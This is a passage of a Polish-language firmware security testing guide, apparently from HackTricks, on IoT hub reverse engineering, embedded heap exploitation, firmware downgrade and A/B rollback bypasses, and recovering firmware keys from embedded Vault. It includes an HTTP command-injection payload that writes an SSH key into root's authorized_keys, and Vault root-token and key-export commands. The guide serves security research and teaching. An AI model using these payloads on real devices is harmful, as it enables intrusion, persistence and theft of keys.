W celu powtarzalnej izolacji usterek zapisuj pliki znaczników z sygnaturami czasowymi na stabilnym woluminie z prawem zapisu, a następnie weryfikuj je offline; `/dev/kmsg`, FIFO i nietrwałe konsole mogą powodować fałszywe wyniki negatywne z powodu ograniczania częstotliwości lub przedwczesnego zakończenia procesu. Przed zmianą niezwiązanych fragmentów kodu porównuj też dokładne interfejsy między warstwami: `uname -r` z `/lib/modules/`, funkcje ext4 na dysku z konfiguracją jądra oraz generację Mesa `libGL` z ABI sterownika DRI i nazwami sterowników wynikającymi z PCI. Komponent może istnieć, a nawet pomyślnie wykonać `dlopen()`, a mimo to być nieużywalny, ponieważ jego odbiorca oczekuje innego ABI.<sup>[[11]](#references)</sup>

## Analiza dynamiczna w praktyce

Na tym etapie do analizy używa się rzeczywistego lub emulowanego środowiska urządzenia. Niezbędne jest zachowanie dostępu do powłoki systemu operacyjnego i systemu plików. Emulacja może nie odwzorowywać dokładnie interakcji ze sprzętem, co czasami wymaga ponownego uruchomienia emulatora. Analiza powinna ponownie objąć system plików, wykorzystywać ujawnione strony WWW i usługi sieciowe oraz badać podatności bootloadera. Testy integralności firmware’u są kluczowe dla wykrywania potencjalnych podatności typu backdoor.

## Techniki analizy w czasie działania

Analiza w czasie działania polega na interakcji z procesem lub plikiem binarnym w jego środowisku operacyjnym. Wykorzystuje się do tego narzędzia takie jak gdb-multiarch, Frida i Ghidra, aby ustawiać breakpointy i identyfikować podatności za pomocą fuzzingu oraz innych technik.

W przypadku systemów wbudowanych bez pełnego debuggera **skopiuj na urządzenie statycznie linkowany `gdbserver`** i podłącz się zdalnie:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapowanie komunikatów Zigbee / radio-co-processor

W hubach IoT stos RF jest często podzielony między **radio MCU** a proces działający w przestrzeni użytkownika systemu Linux. Przydatny schemat pracy polega na prześledzeniu ścieżki:<sup>[[8]](#references)</sup>

1. **Ramka RF** przesyłana drogą radiową
2. **Parser po stronie kontrolera** w radio MCU
3. **Tekstowy protokół szeregowy/UART lub TLV** przekazywany do systemu Linux (na przykład `/dev/tty*`)
4. **Dyspozytor aplikacji** w głównym demonie
5. **Handler / maszyna stanów specyficzne dla protokołu**

Ta architektura tworzy dwa cele do analizy wstecznej zamiast jednego. Jeśli kontroler konwertuje binarne ramki radiowe na protokół tekstowy, taki jak `Group,Command,arg1,arg2,...`, ustal:

- **Grupy komunikatów** i tabele dyspozytora
- Które komunikaty mogą pochodzić z **sieci**, a które od samego kontrolera
- Dokładne **pola identyfikujące producenta** (na przykład Zigbee `manufacturer_code` i niestandardowe `cluster_command`)
- Które handlery są osiągalne wyłącznie podczas **commissioning**, wykrywania lub pobierania firmware/modelu

W przypadku Zigbee przechwyć ruch podczas parowania i sprawdź, czy urządzenie nadal korzysta z domyślnego **Link Key** `ZigBeeAlliance09`. Jeśli tak, podsłuchanie ruchu podczas commissioning może ujawnić **Network Key**. Kody instalacyjne Zigbee 3.0 ograniczają to ryzyko, więc sprawdź, czy testowane urządzenie rzeczywiście ich wymaga.

### Handlery protokołu specyficzne dla producenta i osiągalność zależna od FSM

Niestandardowe polecenia Zigbee/ZCL producenta są często lepszym celem niż standardowe klastry, ponieważ trafiają do **niestandardowego kodu parsującego** i wewnętrznych **FSM**, których walidacja jest słabiej sprawdzona.<sup>[[8]](#references)</sup>

Praktyczny schemat pracy:

- Analizuj wstecz dyspozytor poleceń, aż znajdziesz **handler dostępny wyłącznie dla producenta**.
- Odtwórz tabele **stanu FSM**, **zdarzeń**, **warunków sprawdzających**, **akcji** i **następnych stanów**.
- Zidentyfikuj **stany przejściowe**, które automatycznie przechodzą dalej, oraz gałęzie ponowień/błędów, które ostatecznie resetują lub zwalniają kontrolowany przez atakującego stan.
- Ustal, które prawidłowe wymiany protokołu są wymagane, aby wprowadzić demona w podatny stan, zamiast zakładać, że wadliwy handler jest zawsze osiągalny.

W przypadku protokołów wrażliwych na czas odtwarzanie pakietów z frameworka Python może być zbyt wolne. Bardziej niezawodnym podejściem jest emulowanie prawidłowego urządzenia na rzeczywistym sprzęcie (na przykład **nRF52840**) przy użyciu stosu klasy producenckiej, aby udostępnić właściwe **endpointy**, **atrybuty** i odpowiedni timing commissioning.

### Klasa błędów związanych z fragmentowanym pobieraniem wbudowanych demonów

Powtarzająca się klasa błędów firmware występuje przy **fragmentowanym pobieraniu blobów/modeli/konfiguracji**:<sup>[[8]](#references)</sup>

1. **Pierwszy fragment** (`offset == 0`) zapisuje `ctx->total_size` i alokuje `malloc(total_size)`.
2. Kolejne fragmenty walidują wyłącznie kontrolowane przez atakującego pola **lokalne dla pakietu**, takie jak `packet_total_size >= offset + chunk_len`.
3. Kopiowanie używa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez sprawdzania, czy dane mieszczą się w **pierwotnie zaalokowanym rozmiarze**.

Pozwala to atakującemu wysłać:

- Pierwszy prawidłowy fragment z zadeklarowanym **małym** rozmiarem całkowitym, aby wymusić małą alokację sterty.
- Późniejszy fragment z **oczekiwanym offsetem**, ale większym `chunk_len`.
- Sfałszowany rozmiar lokalny dla pakietu, który przechodzi świeże kontrole, a jednocześnie powoduje przepełnienie pierwotnie zaalokowanego bufora.

Jeśli podatna ścieżka jest osiągalna za pośrednictwem logiki commissioning, exploit musi obejmować wystarczającą **emulację urządzenia**, aby wprowadzić cel w oczekiwany stan pobierania modelu lub bloba, zanim zostaną wysłane nieprawidłowe fragmenty.

### Wyzwalanie `free()` przez protokół

W wbudowanych demonach najłatwiejszym sposobem wyzwolenia wykorzystania metadanych sterty często nie jest „czekanie na sprzątanie”, lecz **wymuszenie obsługi błędów przez sam protokół**:<sup>[[8]](#references)</sup>

- Wysyłaj nieprawidłowe kolejne fragmenty, aby wprowadzić FSM w stan **ponowienia** lub **błędu**.
- Przekrocz limit ponowień, aby demon **zresetował kontekst** i zwolnił uszkodzony bufor.
- Wykorzystaj to przewidywalne `free()`, aby wyzwolić prymitywy po stronie alokatora, zanim proces ulegnie awarii z innych przyczyn.

Jest to szczególnie przydatne w przypadku alokatorów **musl/uClibc/dlmalloc-podobnych** w systemie Linux urządzeń wbudowanych, gdzie uszkodzenie metadanych chunków może zmienić logikę unlink/unbin w prymityw zapisu. Stabilny schemat polega na uszkodzeniu **pola rozmiaru**, aby przekierować przeglądanie alokatora do **fałszywych chunków umieszczonych w przepełnionym buforze**, zamiast od razu nadpisywać rzeczywiste wskaźniki binów i powodować awarię procesu.

## Eksploatacja binarna i Proof-of-Concept

Tworzenie PoC dla wykrytych podatności wymaga dogłębnego zrozumienia architektury celu oraz programowania w językach niskiego poziomu. Zabezpieczenia środowiska uruchomieniowego w systemach wbudowanych są rzadkością, ale jeśli występują, mogą być potrzebne techniki takie jak Return Oriented Programming (ROP).

### Uwagi dotyczące eksploatacji fastbin w uClibc (Linux w systemach wbudowanych)

- **Fastbins + konsolidacja:** uClibc używa fastbinów podobnych do glibc. Późniejsza duża alokacja może wywołać `__malloc_consolidate()`, dlatego każdy fałszywy chunk musi przejść kontrole (rozsądny rozmiar, `fd = 0` i sąsiednie chunki uznane za „zajęte”).<sup>[[6]](#references)</sup>
- **Binarne pliki non-PIE przy ASLR:** jeśli ASLR jest włączone, ale główny plik binarny jest **non-PIE**, adresy `.data/.bss` wewnątrz pliku są stałe. Można wskazać obszar, który już przypomina prawidłowy nagłówek chunka sterty, aby skierować alokację fastbin do **tabeli wskaźników do funkcji**.
- **NUL zatrzymujący parser:** podczas parsowania JSON znak `\x00` w payloadzie może zatrzymać parsowanie, pozostawiając końcowe bajty kontrolowane przez atakującego do wykonania stack pivot/łańcucha ROP.
- **Shellcode przez `/proc/self/mem`:** łańcuch ROP wywołujący `open("/proc/self/mem")`, `lseek()` i `write()` może umieścić wykonywalny shellcode w znanym mapowaniu i przekazać do niego sterowanie.

## Przygotowane systemy operacyjne do analizy firmware

Systemy operacyjne takie jak [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) zapewniają wstępnie skonfigurowane środowiska do testowania bezpieczeństwa firmware, wyposażone w niezbędne narzędzia.

## Przygotowane systemy operacyjne do analizy firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS to dystrybucja przeznaczona do przeprowadzania oceny bezpieczeństwa i testów penetracyjnych urządzeń Internetu rzeczy (IoT). Oszczędza dużo czasu, zapewniając wstępnie skonfigurowane środowisko ze wszystkimi niezbędnymi narzędziami.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): system operacyjny do testowania bezpieczeństwa systemów wbudowanych, oparty na Ubuntu 18.04 i wyposażony w narzędzia do testowania bezpieczeństwa firmware.

## Ataki downgrade firmware i niezabezpieczone mechanizmy aktualizacji

Nawet jeśli producent wdroży kryptograficzne sprawdzanie podpisów obrazów firmware, **ochrona przed przywróceniem starszej wersji (downgrade) jest często pomijana**. Jeśli bootloader lub loader odzyskiwania weryfikuje jedynie podpis za pomocą wbudowanego klucza publicznego, ale nie sprawdza *wersji* (lub monotonicznego licznika) wgrywanego obrazu, atakujący może legalnie zainstalować **starsze, podatne firmware z nadal prawidłowym podpisem**, przywracając w ten sposób załatane podatności.<sup>[[4]](#references)</sup>

Typowy schemat ataku:

1. **Pozyskaj starszy podpisany obraz**
   * Pobierz go z publicznego portalu producenta, CDN-u lub strony pomocy technicznej.
   * Wyodrębnij go z aplikacji mobilnych/desktopowych (np. z katalogu `assets/firmware/` w pliku Android APK).
   * Znajdź go w repozytoriach zewnętrznych, takich jak VirusTotal, archiwa internetowe, fora itp.
2. **Prześlij obraz do urządzenia lub udostępnij go urządzeniu** przez dowolny dostępny kanał aktualizacji:
   * Web UI, API aplikacji mobilnej, USB, TFTP, MQTT itp.
   * Wiele konsumenckich urządzeń IoT udostępnia nieuwierzytelnione endpointy HTTP(S), które przyjmują zakodowane w Base64 bloby firmware, dekodują je po stronie serwera i uruchamiają odzyskiwanie/aktualizację.
3. Po downgrade wykorzystaj podatność załataną w nowszej wersji (na przykład filtr command injection dodany w późniejszym wydaniu).
4. Opcjonalnie ponownie wgraj najnowszy obraz lub wyłącz aktualizacje, aby uniknąć wykrycia po uzyskaniu trwałego dostępu.

### Przykład: command injection po downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

W podatnym firmware (o obniżonej wersji) parametr `md5` jest bezpośrednio łączony z poleceniem powłoki bez oczyszczania, co umożliwia wstrzykiwanie dowolnych poleceń (w tym przypadku — uzyskanie dostępu root za pomocą klucza SSH). W późniejszych wersjach firmware wprowadzono podstawowy filtr znaków, ale brak ochrony przed downgrade’em sprawia, że poprawka jest bezużyteczna.<sup>[[4]](#references)</sup>

### Wyodrębnianie firmware z aplikacji mobilnych

Wielu producentów dołącza pełne obrazy firmware do towarzyszących im aplikacji mobilnych, aby aplikacja mogła aktualizować urządzenie przez Bluetooth/Wi-Fi. Pakiety te są często przechowywane w postaci niezaszyfrowanej w APK/APEX, w ścieżkach takich jak `assets/fw/` lub `res/raw/`. Narzędzia takie jak `apktool`, `ghidra` czy nawet zwykłe `unzip` pozwalają wyodrębnić podpisane obrazy bez fizycznego dostępu do sprzętu.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Obejście anti-rollback wyłącznie w updaterze w konstrukcjach z dwoma slotami A/B

Niektórzy dostawcy implementują **ratchet** zapobiegający downgrade’om, ale tylko w logice *updatera* (na przykład w procedurze UDS przez CAN, komendzie recovery lub agencie OTA w userspace). Jeśli **bootloader** sprawdza później tylko podpis/CRC obrazu i ufa tablicy partycji lub metadanym slotu, nadal można obejść ochronę przed rollbackiem.<sup>[[7]](#references)</sup>

Typowa słaba konstrukcja:

- Metadane firmware zawierają zarówno deskryptor wersji, jak i **ratchet bezpieczeństwa** / licznik monotoniczny.
- Updater porównuje ratchet obrazu z wartością przechowywaną w pamięci trwałej i odrzuca starsze podpisane obrazy.
- **Bootloader** nie analizuje tego ratcheta i przed uruchomieniem wybranego slotu weryfikuje tylko nagłówek, CRC i podpis.
- Aktywacja slotu jest zapisywana osobno w tablicy partycji lub liczniku generacji dla danego slotu i **nie jest kryptograficznie powiązana** z dokładnym skrótem zweryfikowanego firmware.

Tworzy to w systemach z dwoma slotami prymityw umożliwiający **zweryfikowanie jednego obrazu i uruchomienie innego**. Jeśli atakujący może sprawić, że updater oznaczy slot B jako następny cel rozruchu, używając aktualnego podpisanego obrazu, a następnie nadpisać slot B przed ponownym uruchomieniem, bootloader może nadal uruchomić starszy obraz, ponieważ ufa jedynie wcześniej zatwierdzonym metadanym slotu.

Typowy schemat nadużycia:

1. Wgraj **aktualny podpisany** firmware do nieaktywnego slotu i uruchom standardową procedurę weryfikacji/przełączania, aby układ oznaczył ten slot jako następny aktywny.
2. **Nie uruchamiaj jeszcze ponownie urządzenia**. W tej samej sesji ponownie wywołaj procedurę przygotowania/kasowania slotu.
3. Wykorzystaj nieaktualny stan rozruchu lub nieaktualną logikę wyboru slotu, aby updater skasował **ten sam fizyczny slot**, który właśnie został promowany.
4. Zapisz w tym slocie **starszy, ale nadal podpisany** firmware.
5. Pomiń procedurę weryfikacji wymuszającą ratchet i uruchom urządzenie ponownie bezpośrednio.
6. Bootloader wybiera promowany slot, weryfikuje tylko podpis/integralność i uruchamia stary obraz.

Podczas analizowania implementacji aktualizacji A/B szukaj:

- Wyboru slotu opartego na **flagach z czasu rozruchu**, które nie są odświeżane po pomyślnym przełączeniu.
- Procedury w rodzaju `prepare_passive_slot()`, która kasuje slot na podstawie nieaktualnego stanu zamiast **aktualnego zatwierdzonego układu**.
- Funkcji w rodzaju `part_write_layout()`, która jedynie zwiększa **licznik generacji** / ustawia flagę aktywności i nie zapisuje skrótu zweryfikowanego obrazu.
- Kontroli ratcheta zaimplementowanych w userspace lub kodzie updatera, ale **nie** w ROM-ie / bootloaderze / etapach secure boot.
- Procedur kasowania lub recovery, które pozostawiają slot oznaczony jako zdatny do rozruchu, nawet po usunięciu i ponownym zapisaniu jego zawartości.

### Lista kontrolna oceny logiki aktualizacji

* Czy transport i uwierzytelnianie *endpointu aktualizacji* są odpowiednio zabezpieczone (TLS + uwierzytelnianie)?
* Czy urządzenie porównuje **numery wersji** lub **monotoniczny licznik anti-rollback** przed flashowaniem?
* Czy obraz jest weryfikowany w ramach łańcucha secure boot (np. podpisy sprawdza kod ROM)?
* Czy **bootloader wymusza ten sam ratchet** co updater, zamiast sprawdzać tylko podpis/CRC?
* Czy metadane aktywacji slotu są **powiązane ze zweryfikowanym skrótem/wersją firmware**, czy też slot można zmienić po jego promocji?
* Czy po pomyślnym przełączeniu slotu urządzenie musi się ponownie uruchomić, czy też w tej samej sesji nadal można wywoływać kolejne procedury aktualizacji/kasowania?
* Czy kod userlandu wykonuje dodatkowe kontrole poprawności (np. dozwolonej mapy partycji, numeru modelu)?
* Czy przepływy aktualizacji *częściowej* lub *z użyciem kopii zapasowej* korzystają ponownie z tej samej logiki weryfikacji?

> 💡  Jeśli brakuje któregokolwiek z powyższych elementów, platforma jest prawdopodobnie podatna na ataki rollback.

## Podatne firmware do ćwiczeń

Aby ćwiczyć wykrywanie podatności w firmware, zacznij od poniższych podatnych projektów firmware.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Odzyskiwanie kluczy deszyfrujących firmware ze stanu wbudowanego KMS/Vault

Gdy obraz aktualizacji łączy niewielkie metadane w postaci jawnej z dużym blobem o wysokiej entropii, przed próbami brute-force przeanalizuj kontener:<sup>[[1]](#references)</sup>

- Zrzuć nagłówki, offsety i granice wierszy za pomocą `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` zwykle oznacza format OpenSSL `enc`: kolejne 8 bajtów to salt, a pozostałe bajty to szyfrogram.
- Pole Base64, które po dekodowaniu ma dokładnie `256` bajtów, mocno sugeruje, że masz do czynienia z szyfrogramem RSA-2048, który opakowuje losowe hasło firmware/klucz sesji.
- Dołączony do tego samego pliku materiał PGP często służy wyłącznie do weryfikacji autentyczności; nie zakładaj, że zapewnia poufność.

Jeśli statyczne wyszukiwanie kluczy (`grep`, `strings`, wyszukiwanie PEM/PGP) zawiedzie, przeanalizuj **operacyjną ścieżkę deszyfrowania**, zamiast szukać wyłącznie kluczy prywatnych:

- Zdekompiluj updater / plik binarny do zarządzania i prześledź, kto odczytuje zaszyfrowany blob, która funkcja pomocnicza/API go odpakowuje oraz jakiej logicznej nazwy klucza żąda.
- Przeszukaj wyodrębniony główny system plików w poszukiwaniu stanu KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) oraz plików jednostek i skryptów init.
- Traktuj jawną komendę `vault operator unseal ...`, klucze recovery, tokeny bootstrap lub lokalne skrypty automatycznego odpieczętowywania KMS jako odpowiedniki materiału klucza prywatnego.

Jeśli urządzenie zawiera oryginalny plik binarny Vault i backend pamięci, odtworzenie tego środowiska jest zwykle łatwiejsze niż ponowna implementacja mechanizmów wewnętrznych Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Z uprawnieniami root na sklonowanym KMS:

- Ustaw klucze transit jako eksportowalne wyłącznie w odizolowanym klonie: `vault write transit/keys/<name>/config exportable=true`
- Wyeksportuj klucz unwrap: `vault read transit/export/encryption-key/<name>`
- Sprawdź odzyskany klucz RSA, używając dokładnej pary padding/hash stosowanej przez KMS. Nieudane odszyfrowanie PKCS#1 v1.5 i nieudane domyślne odszyfrowanie OAEP **nie** dowodzą, że klucz jest nieprawidłowy; wiele przepływów opartych na Vault używa OAEP z SHA-256, podczas gdy popularne biblioteki domyślnie używają SHA-1.
- Jeśli payload zaczyna się od `Salted__`, dokładnie odtwórz KDF OpenSSL używany przez dostawcę (`EVP_BytesToKey`, często MD5 w starszych urządzeniach), zanim spróbujesz odszyfrować AES-CBC.

Dzięki temu „zaszyfrowane firmware” staje się ogólniejszym problemem: **odzyskaj klucze operacyjne po stronie urządzenia, a następnie odtwórz dokładne parametry unwrap + KDF offline**.

## Szkolenia i certyfikaty

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Łamanie zabezpieczeń firmware’u z Claude: umiejętności na poziomie seniora, autonomia na poziomie juniora](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodyka testowania bezpieczeństwa firmware’u](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktyczny hacking IoT: kompleksowy przewodnik po atakowaniu Internetu rzeczy](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Wykorzystywanie zero-dayów w porzuconym sprzęcie – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jak inteligentne urządzenie za 20 USD dało mi dostęp do twojego domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Teraz widzisz mi: teraz jesteś przejęty](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv — Wykorzystanie Tesla Wall Connector przez złącze portu ładowania — część 2: obejście zabezpieczenia przed downgrade’em](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Niech zamiga: zdalne wykorzystanie Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, część 1: rozpakowywanie](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacja jądra Linux — dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, część 2: debugowanie i naprawianie](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Hasła BIOS-u Dell: słabe szyfrowanie XOR umożliwia odzyskanie ze SPI Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn — narzędzie do odzyskiwania haseł BIOS-u Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
